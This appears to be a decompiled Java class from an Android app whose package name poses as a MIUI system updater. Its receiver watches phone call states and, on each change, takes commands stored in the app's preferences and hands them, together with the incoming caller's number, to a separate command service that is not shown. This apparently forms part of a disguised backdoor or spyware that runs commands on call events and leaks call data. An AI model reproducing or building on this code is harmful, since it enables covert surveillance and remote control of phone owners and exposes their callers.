package brandmangroupe.miui.updater;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.util.Map;

public class IncomingCall extends BroadcastReceiver {
    public Context ctx;

    public class MyPhoneStateListener extends PhoneStateListener {
        public void onCallStateChanged(int state, String incomingNumber) {
            Map<String, ?> items = IncomingCall.this.ctx.getSharedPreferences("Call_conf", 0).getAll();
            if (items.size() > 0) {
                for (String s : items.keySet()) {
                    String cmd = getcmd(IncomingCall.this.ctx, s);
                    if (cmd.length() > 2) {
                        Intent intent = new Intent(IncomingCall.this.ctx, GlobalCode.class);
                        intent.putExtra("content", cmd);
                        intent.putExtra("type", "TriggerCall:" + s);
                        intent.putExtra("data", new StringBuilder(String.valueOf(state)).append(":").append(incomingNumber).toString());
                        IncomingCall.this.ctx.startService(intent);
                    }
                }
            }
        }

        public String getcmd(Context ctx, String command) {
            return ctx.getSharedPreferences("Cmd_conf", 0).getString(command, "");
        }
    }

    public void onReceive(Context context, Intent intent) {
        this.ctx = context;
        try {
            ((TelephonyManager) context.getSystemService("phone")).listen(new MyPhoneStateListener(), 32);
        } catch (Exception e) {
            Log.e("Phone Receive Error", " " + e);
        }
    }
}
